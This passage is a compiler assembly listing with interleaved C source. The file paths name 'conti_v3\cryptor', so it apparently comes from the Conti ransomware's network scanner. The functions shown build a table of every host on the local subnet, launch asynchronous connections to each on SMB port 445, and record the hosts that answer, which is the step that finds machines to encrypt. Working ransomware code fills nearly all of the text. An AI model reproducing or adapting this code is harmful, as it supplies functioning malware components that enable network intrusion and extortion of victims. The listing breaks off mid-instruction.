  00288	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread
$LN30@PortScanHa:

; 566  : 				}
; 567  : 
; 568  : 				IsTimerActivated = FALSE;

  0028d	c7 45 24 00 00
	00 00		 mov	 DWORD PTR IsTimerActivated$[rbp], 0
$LN26@PortScanHa:

; 569  : 
; 570  : 			}

  00294	e9 7d 01 00 00	 jmp	 $LN23@PortScanHa
$LN22@PortScanHa:

; 571  : 
; 572  : 		} else if (CompletionStatus == TIMER_COMPLETION_KEY) {

  00299	48 83 bd 88 00
	00 00 03	 cmp	 QWORD PTR CompletionStatus$8[rbp], 3
  002a1	0f 85 6f 01 00
	00		 jne	 $LN31@PortScanHa

; 573  : 
; 574  : 			IsTimerActivated = TRUE;

  002a7	c7 45 24 01 00
	00 00		 mov	 DWORD PTR IsTimerActivated$[rbp], 1

; 575  : 
; 576  : 			if (g_ActiveOperations) {

  002ae	83 3d 00 00 00
	00 00		 cmp	 DWORD PTR ?g_ActiveOperations@@3JA, 0 ; g_ActiveOperations
  002b5	74 5e		 je	 SHORT $LN32@PortScanHa

; 577  : 
; 578  : 				PCONNECT_CONTEXT ConnectCtx = NULL;

  002b7	48 c7 85 08 01
	00 00 00 00 00
	00		 mov	 QWORD PTR ConnectCtx$12[rbp], 0

; 579  : 				TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

  002c2	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  002c9	48 89 85 08 01
	00 00		 mov	 QWORD PTR ConnectCtx$12[rbp], rax
  002d0	eb 12		 jmp	 SHORT $LN11@PortScanHa
$LN9@PortScanHa:
  002d2	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR ConnectCtx$12[rbp]
  002d9	48 8b 40 30	 mov	 rax, QWORD PTR [rax+48]
  002dd	48 89 85 08 01
	00 00		 mov	 QWORD PTR ConnectCtx$12[rbp], rax
$LN11@PortScanHa:
  002e4	48 83 bd 08 01
	00 00 00	 cmp	 QWORD PTR ConnectCtx$12[rbp], 0
  002ec	74 22		 je	 SHORT $LN10@PortScanHa

; 580  : 
; 581  : 					if (ConnectCtx->State == CONNECTING) {

  002ee	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR ConnectCtx$12[rbp]
  002f5	0f b6 40 2c	 movzx	 eax, BYTE PTR [rax+44]
  002f9	83 f8 01	 cmp	 eax, 1
  002fc	75 10		 jne	 SHORT $LN34@PortScanHa

; 582  : 						pCancelIo((HANDLE)ConnectCtx->s);

  002fe	48 8b 85 08 01
	00 00		 mov	 rax, QWORD PTR ConnectCtx$12[rbp]
  00305	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  00309	e8 00 00 00 00	 call	 ?pCancelIo@@YAHPEAX@Z	; pCancelIo
$LN34@PortScanHa:

; 583  : 					}
; 584  : 
; 585  : 				}

  0030e	eb c2		 jmp	 SHORT $LN9@PortScanHa
$LN10@PortScanHa:

; 586  : 
; 587  : 			} else {

  00310	e9 01 01 00 00	 jmp	 $LN33@PortScanHa
$LN32@PortScanHa:
$LN12@PortScanHa:

; 588  : 
; 589  : 				while (!TAILQ_EMPTY(&g_ConnectionList)) {

  00315	48 83 3d 00 00
	00 00 00	 cmp	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A, 0
  0031d	0f 84 9f 00 00
	00		 je	 $LN13@PortScanHa

; 590  : 
; 591  : 					PCONNECT_CONTEXT ConnectCtx = TAILQ_FIRST(&g_ConnectionList);

  00323	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  0032a	48 89 85 28 01
	00 00		 mov	 QWORD PTR ConnectCtx$13[rbp], rax

; 592  : 					pshutdown(ConnectCtx->s, SD_SEND);

  00331	ba 01 00 00 00	 mov	 edx, 1
  00336	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR ConnectCtx$13[rbp]
  0033d	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  00341	e8 00 00 00 00	 call	 ?pshutdown@@YAH_KH@Z	; pshutdown

; 593  : 					pclosesocket(ConnectCtx->s);

  00346	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR ConnectCtx$13[rbp]
  0034d	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  00351	e8 00 00 00 00	 call	 ?pclosesocket@@YAH_K@Z	; pclosesocket
$LN16@PortScanHa:

; 594  : 					TAILQ_REMOVE(&g_ConnectionList, ConnectCtx, Entries);

  00356	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR ConnectCtx$13[rbp]
  0035d	48 83 78 30 00	 cmp	 QWORD PTR [rax+48], 0
  00362	74 1c		 je	 SHORT $LN35@PortScanHa
  00364	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR ConnectCtx$13[rbp]
  0036b	48 8b 40 30	 mov	 rax, QWORD PTR [rax+48]
  0036f	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$13[rbp]
  00376	48 8b 49 38	 mov	 rcx, QWORD PTR [rcx+56]
  0037a	48 89 48 38	 mov	 QWORD PTR [rax+56], rcx
  0037e	eb 12		 jmp	 SHORT $LN36@PortScanHa
$LN35@PortScanHa:
  00380	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR ConnectCtx$13[rbp]
  00387	48 8b 40 38	 mov	 rax, QWORD PTR [rax+56]
  0038b	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8, rax
$LN36@PortScanHa:
  00392	48 8b 85 28 01
	00 00		 mov	 rax, QWORD PTR ConnectCtx$13[rbp]
  00399	48 8b 40 38	 mov	 rax, QWORD PTR [rax+56]
  0039d	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$13[rbp]
  003a4	48 8b 49 30	 mov	 rcx, QWORD PTR [rcx+48]
  003a8	48 89 08	 mov	 QWORD PTR [rax], rcx
  003ab	33 c0		 xor	 eax, eax
  003ad	85 c0		 test	 eax, eax
  003af	75 a5		 jne	 SHORT $LN16@PortScanHa

; 595  : 					pGlobalFree(ConnectCtx);

  003b1	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$13[rbp]
  003b8	e8 00 00 00 00	 call	 ?pGlobalFree@@YAPEAXPEAX@Z ; pGlobalFree

; 596  : 
; 597  : 				}

  003bd	e9 53 ff ff ff	 jmp	 $LN12@PortScanHa
$LN13@PortScanHa:

; 598  : 
; 599  : 				if (!CreateHostTable()) {

  003c2	e8 00 00 00 00	 call	 ?CreateHostTable@@YAHXZ	; CreateHostTable
  003c7	85 c0		 test	 eax, eax
  003c9	75 02		 jne	 SHORT $LN37@PortScanHa

; 600  : 					break;

  003cb	eb 4e		 jmp	 SHORT $LN3@PortScanHa
$LN37@PortScanHa:

; 601  : 				}
; 602  : 
; 603  : 				ScanHosts();

  003cd	e8 00 00 00 00	 call	 ?ScanHosts@@YAXXZ	; ScanHosts

; 604  : 
; 605  : 				if (!pCreateTimerQueueTimer(&hTimer, hTimerQueue, &TimerCallback, NULL, 30000, 0, 0)) {

  003d2	c7 44 24 30 00
	00 00 00	 mov	 DWORD PTR [rsp+48], 0
  003da	c7 44 24 28 00
	00 00 00	 mov	 DWORD PTR [rsp+40], 0
  003e2	c7 44 24 20 30
	75 00 00	 mov	 DWORD PTR [rsp+32], 30000 ; 00007530H
  003ea	45 33 c9	 xor	 r9d, r9d
  003ed	4c 8d 05 00 00
	00 00		 lea	 r8, OFFSET FLAT:?TimerCallback@@YAXPEAXE@Z ; TimerCallback
  003f4	48 8b 55 48	 mov	 rdx, QWORD PTR hTimerQueue$[rbp]
  003f8	48 8d 4d 08	 lea	 rcx, QWORD PTR hTimer$[rbp]
  003fc	e8 00 00 00 00	 call	 ?pCreateTimerQueueTimer@@YAHPEAPEAXPEAXP6AX1E@Z1KKK@Z ; pCreateTimerQueueTimer
  00401	85 c0		 test	 eax, eax
  00403	75 0a		 jne	 SHORT $LN38@PortScanHa

; 606  : 					pExitThread(EXIT_FAILURE);

  00405	b9 01 00 00 00	 mov	 ecx, 1
  0040a	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread
$LN38@PortScanHa:

; 607  : 				}
; 608  : 
; 609  : 				IsTimerActivated = FALSE;

  0040f	c7 45 24 00 00
	00 00		 mov	 DWORD PTR IsTimerActivated$[rbp], 0
$LN33@PortScanHa:
$LN31@PortScanHa:
$LN23@PortScanHa:
$LN19@PortScanHa:

; 610  : 			}
; 611  : 
; 612  : 		}
; 613  : 
; 614  : 	}

  00416	e9 61 fc ff ff	 jmp	 $LN2@PortScanHa
$LN3@PortScanHa:

; 615  : 
; 616  : 	pDeleteTimerQueue(hTimerQueue);

  0041b	48 8b 4d 48	 mov	 rcx, QWORD PTR hTimerQueue$[rbp]
  0041f	e8 00 00 00 00	 call	 ?pDeleteTimerQueue@@YAHPEAX@Z ; pDeleteTimerQueue

; 617  : 	pExitThread(EXIT_SUCCESS);

  00424	33 c9		 xor	 ecx, ecx
  00426	e8 00 00 00 00	 call	 ?pExitThread@@YAXK@Z	; pExitThread

; 618  : 	return EXIT_SUCCESS;

  0042b	33 c0		 xor	 eax, eax

; 619  : }

  0042d	8b f8		 mov	 edi, eax
  0042f	48 8d 4d c0	 lea	 rcx, QWORD PTR [rbp-64]
  00433	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?PortScanHandler@@YAKPEAX@Z$rtcFrameData
  0043a	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  0043f	8b c7		 mov	 eax, edi
  00441	48 8b 8d f8 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00448	48 33 cd	 xor	 rcx, rbp
  0044b	e8 00 00 00 00	 call	 __security_check_cookie
  00450	48 8d a5 08 02
	00 00		 lea	 rsp, QWORD PTR [rbp+520]
  00457	5f		 pop	 rdi
  00458	5d		 pop	 rbp
  00459	c3		 ret	 0
?PortScanHandler@@YAKPEAX@Z ENDP			; PortScanHandler
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?TimerCallback@@YAXPEAXE@Z
_TEXT	SEGMENT
Arg$ = 224
TimerOrWaitFired$ = 232
?TimerCallback@@YAXPEAXE@Z PROC				; TimerCallback, COMDAT

; 491  : TimerCallback(PVOID Arg, BOOLEAN TimerOrWaitFired) {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 492  : 	pPostQueuedCompletionStatus(g_IocpHandle, 0, TIMER_COMPLETION_KEY, NULL);

  00023	45 33 c9	 xor	 r9d, r9d
  00026	41 b8 03 00 00
	00		 mov	 r8d, 3
  0002c	33 d2		 xor	 edx, edx
  0002e	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
  00035	e8 00 00 00 00	 call	 ?pPostQueuedCompletionStatus@@YAHPEAXK_KPEAU_OVERLAPPED@@@Z ; pPostQueuedCompletionStatus

; 493  : }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?TimerCallback@@YAXPEAXE@Z ENDP				; TimerCallback
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?CompleteAsyncConnect@@YAH_K@Z
_TEXT	SEGMENT
Result$ = 4
Seconds$ = 36
Bytes$ = 68
__$ArrayPad$ = 280
s$ = 320
?CompleteAsyncConnect@@YAH_K@Z PROC			; CompleteAsyncConnect, COMDAT

; 471  : {

$LN6:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 58 01
	00 00		 sub	 rsp, 344		; 00000158H
  0000e	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00013	48 8d 7c 24 30	 lea	 rdi, QWORD PTR [rsp+48]
  00018	b9 1a 00 00 00	 mov	 ecx, 26
  0001d	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00022	f3 ab		 rep stosd
  00024	48 8b 8c 24 78
	01 00 00	 mov	 rcx, QWORD PTR [rsp+376]
  0002c	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00033	48 33 c5	 xor	 rax, rbp
  00036	48 89 85 18 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00044	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 472  : 	int Result = (INT)psetsockopt(s, SOL_SOCKET, SO_UPDATE_CONNECT_CONTEXT, NULL, 0);

  00049	c7 44 24 20 00
	00 00 00	 mov	 DWORD PTR [rsp+32], 0
  00051	45 33 c9	 xor	 r9d, r9d
  00054	41 b8 10 70 00
	00		 mov	 r8d, 28688		; 00007010H
  0005a	ba ff ff 00 00	 mov	 edx, 65535		; 0000ffffH
  0005f	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR s$[rbp]
  00066	e8 00 00 00 00	 call	 ?psetsockopt@@YAH_KHHPEBDH@Z ; psetsockopt
  0006b	89 45 04	 mov	 DWORD PTR Result$[rbp], eax

; 473  : 	if (Result != ERROR_SUCCESS)

  0006e	83 7d 04 00	 cmp	 DWORD PTR Result$[rbp], 0
  00072	74 04		 je	 SHORT $LN2@CompleteAs

; 474  : 		return FALSE;

  00074	33 c0		 xor	 eax, eax
  00076	eb 47		 jmp	 SHORT $LN1@CompleteAs
$LN2@CompleteAs:

; 475  : 
; 476  : 	int Seconds;
; 477  : 	int Bytes = sizeof(Seconds);

  00078	c7 45 44 04 00
	00 00		 mov	 DWORD PTR Bytes$[rbp], 4

; 478  : 	Result = (INT)pgetsockopt(s, SOL_SOCKET, SO_CONNECT_TIME, (char*)&Seconds, (PINT)&Bytes);

  0007f	48 8d 45 44	 lea	 rax, QWORD PTR Bytes$[rbp]
  00083	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  00088	4c 8d 4d 24	 lea	 r9, QWORD PTR Seconds$[rbp]
  0008c	41 b8 0c 70 00
	00		 mov	 r8d, 28684		; 0000700cH
  00092	ba ff ff 00 00	 mov	 edx, 65535		; 0000ffffH
  00097	48 8b 8d 40 01
	00 00		 mov	 rcx, QWORD PTR s$[rbp]
  0009e	e8 00 00 00 00	 call	 ?pgetsockopt@@YAH_KHHPEADPEAH@Z ; pgetsockopt
  000a3	89 45 04	 mov	 DWORD PTR Result$[rbp], eax

; 479  : 	if (Result != ERROR_SUCCESS)

  000a6	83 7d 04 00	 cmp	 DWORD PTR Result$[rbp], 0
  000aa	74 04		 je	 SHORT $LN3@CompleteAs

; 480  : 		return FALSE;

  000ac	33 c0		 xor	 eax, eax
  000ae	eb 0f		 jmp	 SHORT $LN1@CompleteAs
$LN3@CompleteAs:

; 481  : 
; 482  : 	if (Seconds == 0xFFFFFFFF)

  000b0	83 7d 24 ff	 cmp	 DWORD PTR Seconds$[rbp], -1 ; ffffffffH
  000b4	75 04		 jne	 SHORT $LN4@CompleteAs

; 483  : 		return FALSE;

  000b6	33 c0		 xor	 eax, eax
  000b8	eb 05		 jmp	 SHORT $LN1@CompleteAs
$LN4@CompleteAs:

; 484  : 
; 485  : 	return TRUE;

  000ba	b8 01 00 00 00	 mov	 eax, 1
$LN1@CompleteAs:

; 486  : }

  000bf	48 8b f8	 mov	 rdi, rax
  000c2	48 8d 4d d0	 lea	 rcx, QWORD PTR [rbp-48]
  000c6	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?CompleteAsyncConnect@@YAH_K@Z$rtcFrameData
  000cd	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  000d2	48 8b c7	 mov	 rax, rdi
  000d5	48 8b 8d 18 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  000dc	48 33 cd	 xor	 rcx, rbp
  000df	e8 00 00 00 00	 call	 __security_check_cookie
  000e4	48 8d a5 28 01
	00 00		 lea	 rsp, QWORD PTR [rbp+296]
  000eb	5f		 pop	 rdi
  000ec	5d		 pop	 rbp
  000ed	c3		 ret	 0
?CompleteAsyncConnect@@YAH_K@Z ENDP			; CompleteAsyncConnect
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?ScanHosts@@YAXXZ
_TEXT	SEGMENT
ConnectCtx$ = 8
dwBytesSent$5 = 36
SockAddr$6 = 72
__$ArrayPad$ = 296
?ScanHosts@@YAXXZ PROC					; ScanHosts, COMDAT

; 442  : {

$LN9:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 78 01
	00 00		 sub	 rsp, 376		; 00000178H
  0000a	48 8d 6c 24 40	 lea	 rbp, QWORD PTR [rsp+64]
  0000f	48 8d 7c 24 40	 lea	 rdi, QWORD PTR [rsp+64]
  00014	b9 1e 00 00 00	 mov	 ecx, 30
  00019	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0001e	f3 ab		 rep stosd
  00020	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00027	48 33 c5	 xor	 rax, rbp
  0002a	48 89 85 28 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00031	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00038	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 443  : 	PCONNECT_CONTEXT ConnectCtx = NULL;

  0003d	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR ConnectCtx$[rbp], 0

; 444  : 	TAILQ_FOREACH(ConnectCtx, &g_ConnectionList, Entries) {

  00045	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A
  0004c	48 89 45 08	 mov	 QWORD PTR ConnectCtx$[rbp], rax
  00050	eb 0c		 jmp	 SHORT $LN4@ScanHosts
$LN2@ScanHosts:
  00052	48 8b 45 08	 mov	 rax, QWORD PTR ConnectCtx$[rbp]
  00056	48 8b 40 30	 mov	 rax, QWORD PTR [rax+48]
  0005a	48 89 45 08	 mov	 QWORD PTR ConnectCtx$[rbp], rax
$LN4@ScanHosts:
  0005e	48 83 7d 08 00	 cmp	 QWORD PTR ConnectCtx$[rbp], 0
  00063	0f 84 a6 00 00
	00		 je	 $LN3@ScanHosts

; 445  : 
; 446  : 		DWORD dwBytesSent;
; 447  : 		SOCKADDR_IN SockAddr;
; 448  : 		RtlSecureZeroMemory(&SockAddr, sizeof(SockAddr));

  00069	ba 10 00 00 00	 mov	 edx, 16
  0006e	48 8d 4d 48	 lea	 rcx, QWORD PTR SockAddr$6[rbp]
  00072	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 449  : 		SockAddr.sin_family = AF_INET;

  00077	b8 02 00 00 00	 mov	 eax, 2
  0007c	66 89 45 48	 mov	 WORD PTR SockAddr$6[rbp], ax

; 450  : 		SockAddr.sin_port = htons(SMB_PORT);

  00080	66 b9 bd 01	 mov	 cx, 445			; 000001bdH
  00084	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_htons
  0008a	66 89 45 4a	 mov	 WORD PTR SockAddr$6[rbp+2], ax

; 451  : 		SockAddr.sin_addr.s_addr = ConnectCtx->dwAddres;

  0008e	48 8b 45 08	 mov	 rax, QWORD PTR ConnectCtx$[rbp]
  00092	8b 40 28	 mov	 eax, DWORD PTR [rax+40]
  00095	89 45 4c	 mov	 DWORD PTR SockAddr$6[rbp+4], eax

; 452  : 
; 453  : 		if (g_ConnectEx(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr), NULL, 0, &dwBytesSent, (LPOVERLAPPED)ConnectCtx)) {

  00098	48 8b 45 08	 mov	 rax, QWORD PTR ConnectCtx$[rbp]
  0009c	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  000a1	48 8d 45 24	 lea	 rax, QWORD PTR dwBytesSent$5[rbp]
  000a5	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  000aa	c7 44 24 20 00
	00 00 00	 mov	 DWORD PTR [rsp+32], 0
  000b2	45 33 c9	 xor	 r9d, r9d
  000b5	41 b8 10 00 00
	00		 mov	 r8d, 16
  000bb	48 8d 55 48	 lea	 rdx, QWORD PTR SockAddr$6[rbp]
  000bf	48 8b 45 08	 mov	 rax, QWORD PTR ConnectCtx$[rbp]
  000c3	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  000c7	ff 15 00 00 00
	00		 call	 QWORD PTR ?g_ConnectEx@@3P6AH_KPEBUsockaddr@@HPEAXKPEAKPEAU_OVERLAPPED@@@ZEA ; g_ConnectEx
  000cd	85 c0		 test	 eax, eax
  000cf	74 16		 je	 SHORT $LN5@ScanHosts

; 454  : 
; 455  : 			ConnectCtx->State = CONNECTED;

  000d1	48 8b 45 08	 mov	 rax, QWORD PTR ConnectCtx$[rbp]
  000d5	c6 40 2c 00	 mov	 BYTE PTR [rax+44], 0

; 456  : 			AddHost(ConnectCtx->dwAddres);

  000d9	48 8b 45 08	 mov	 rax, QWORD PTR ConnectCtx$[rbp]
  000dd	8b 48 28	 mov	 ecx, DWORD PTR [rax+40]
  000e0	e8 00 00 00 00	 call	 ?AddHost@@YAHK@Z	; AddHost

; 457  : 
; 458  : 		}

  000e5	eb 23		 jmp	 SHORT $LN6@ScanHosts
$LN5@ScanHosts:

; 459  : 		else if (WSA_IO_PENDING == WSAGetLastError()) {

  000e7	ff 15 00 00 00
	00		 call	 QWORD PTR __imp_WSAGetLastError
  000ed	3d e5 03 00 00	 cmp	 eax, 997		; 000003e5H
  000f2	75 16		 jne	 SHORT $LN7@ScanHosts

; 460  : 
; 461  : 			g_ActiveOperations++;

  000f4	8b 05 00 00 00
	00		 mov	 eax, DWORD PTR ?g_ActiveOperations@@3JA ; g_ActiveOperations
  000fa	ff c0		 inc	 eax
  000fc	89 05 00 00 00
	00		 mov	 DWORD PTR ?g_ActiveOperations@@3JA, eax ; g_ActiveOperations

; 462  : 			ConnectCtx->State = CONNECTING;

  00102	48 8b 45 08	 mov	 rax, QWORD PTR ConnectCtx$[rbp]
  00106	c6 40 2c 01	 mov	 BYTE PTR [rax+44], 1
$LN7@ScanHosts:
$LN6@ScanHosts:

; 463  : 
; 464  : 		}
; 465  : 	}

  0010a	e9 43 ff ff ff	 jmp	 $LN2@ScanHosts
$LN3@ScanHosts:

; 466  : }

  0010f	48 8d 4d c0	 lea	 rcx, QWORD PTR [rbp-64]
  00113	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?ScanHosts@@YAXXZ$rtcFrameData
  0011a	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  0011f	48 8b 8d 28 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  00126	48 33 cd	 xor	 rcx, rbp
  00129	e8 00 00 00 00	 call	 __security_check_cookie
  0012e	48 8d a5 38 01
	00 00		 lea	 rsp, QWORD PTR [rbp+312]
  00135	5f		 pop	 rdi
  00136	5d		 pop	 rbp
  00137	c3		 ret	 0
?ScanHosts@@YAXXZ ENDP					; ScanHosts
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?CreateHostTable@@YAHXZ
_TEXT	SEGMENT
SubnetInfo$ = 8
bAddres$ = 36
dwAddress$ = 68
i$6 = 100
ConnectCtx$7 = 136
SockAddr$8 = 168
__$ArrayPad$ = 392
?CreateHostTable@@YAHXZ PROC				; CreateHostTable, COMDAT

; 378  : {

$LN19:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec c8 01
	00 00		 sub	 rsp, 456		; 000001c8H
  0000a	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  0000f	48 8d 7c 24 30	 lea	 rdi, QWORD PTR [rsp+48]
  00014	b9 36 00 00 00	 mov	 ecx, 54			; 00000036H
  00019	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  0001e	f3 ab		 rep stosd
  00020	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00027	48 33 c5	 xor	 rax, rbp
  0002a	48 89 85 88 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  00031	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00038	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 379  : 	PSUBNET_INFO SubnetInfo = TAILQ_FIRST(&g_SubnetList);

  0003d	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR ?g_SubnetList@@3Usubnet_list_@@A
  00044	48 89 45 08	 mov	 QWORD PTR SubnetInfo$[rbp], rax

; 380  : 	if (!SubnetInfo) {

  00048	48 83 7d 08 00	 cmp	 QWORD PTR SubnetInfo$[rbp], 0
  0004d	75 07		 jne	 SHORT $LN11@CreateHost

; 381  : 		return FALSE;

  0004f	33 c0		 xor	 eax, eax
  00051	e9 45 02 00 00	 jmp	 $LN1@CreateHost
$LN11@CreateHost:

; 382  : 	}
; 383  : 
; 384  : 	BYTE bAddres[4];
; 385  : 	DWORD dwAddress;
; 386  : 	RtlCopyMemory(bAddres, &SubnetInfo->dwAddress, 4);

  00056	48 8b 45 08	 mov	 rax, QWORD PTR SubnetInfo$[rbp]
  0005a	41 b8 04 00 00
	00		 mov	 r8d, 4
  00060	48 8b d0	 mov	 rdx, rax
  00063	48 8d 4d 24	 lea	 rcx, QWORD PTR bAddres$[rbp]
  00067	e8 00 00 00 00	 call	 memcpy

; 387  : 
; 388  : 	for (BYTE i = 0; i < 255; i++) {

  0006c	c6 45 64 00	 mov	 BYTE PTR i$6[rbp], 0
  00070	eb 09		 jmp	 SHORT $LN4@CreateHost
$LN2@CreateHost:
  00072	0f b6 45 64	 movzx	 eax, BYTE PTR i$6[rbp]
  00076	fe c0		 inc	 al
  00078	88 45 64	 mov	 BYTE PTR i$6[rbp], al
$LN4@CreateHost:
  0007b	0f b6 45 64	 movzx	 eax, BYTE PTR i$6[rbp]
  0007f	3d ff 00 00 00	 cmp	 eax, 255		; 000000ffH
  00084	0f 8d ba 01 00
	00		 jge	 $LN3@CreateHost

; 389  : 
; 390  : 		bAddres[3] = i;

  0008a	b8 01 00 00 00	 mov	 eax, 1
  0008f	48 6b c0 03	 imul	 rax, rax, 3
  00093	0f b6 4d 64	 movzx	 ecx, BYTE PTR i$6[rbp]
  00097	88 4c 05 24	 mov	 BYTE PTR bAddres$[rbp+rax], cl

; 391  : 		RtlCopyMemory(&dwAddress, bAddres, 4);

  0009b	41 b8 04 00 00
	00		 mov	 r8d, 4
  000a1	48 8d 55 24	 lea	 rdx, QWORD PTR bAddres$[rbp]
  000a5	48 8d 4d 44	 lea	 rcx, QWORD PTR dwAddress$[rbp]
  000a9	e8 00 00 00 00	 call	 memcpy

; 392  : 
; 393  : 		PCONNECT_CONTEXT ConnectCtx = (PCONNECT_CONTEXT)pGlobalAlloc(GPTR, sizeof(CONNECT_CONTEXT));

  000ae	ba 40 00 00 00	 mov	 edx, 64			; 00000040H
  000b3	b9 40 00 00 00	 mov	 ecx, 64			; 00000040H
  000b8	e8 00 00 00 00	 call	 ?pGlobalAlloc@@YAPEAXI_K@Z ; pGlobalAlloc
  000bd	48 89 85 88 00
	00 00		 mov	 QWORD PTR ConnectCtx$7[rbp], rax

; 394  : 		if (!ConnectCtx) {

  000c4	48 83 bd 88 00
	00 00 00	 cmp	 QWORD PTR ConnectCtx$7[rbp], 0
  000cc	75 05		 jne	 SHORT $LN12@CreateHost

; 395  : 			break;

  000ce	e9 71 01 00 00	 jmp	 $LN3@CreateHost
$LN12@CreateHost:

; 396  : 		}
; 397  : 
; 398  : 		ConnectCtx->dwAddres = dwAddress;

  000d3	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  000da	8b 4d 44	 mov	 ecx, DWORD PTR dwAddress$[rbp]
  000dd	89 48 28	 mov	 DWORD PTR [rax+40], ecx

; 399  : 		ConnectCtx->State = NOT_CONNECTED;

  000e0	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  000e7	c6 40 2c 02	 mov	 BYTE PTR [rax+44], 2

; 400  : 		ConnectCtx->s = (SOCKET)pWSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);

  000eb	c7 44 24 28 01
	00 00 00	 mov	 DWORD PTR [rsp+40], 1
  000f3	c7 44 24 20 00
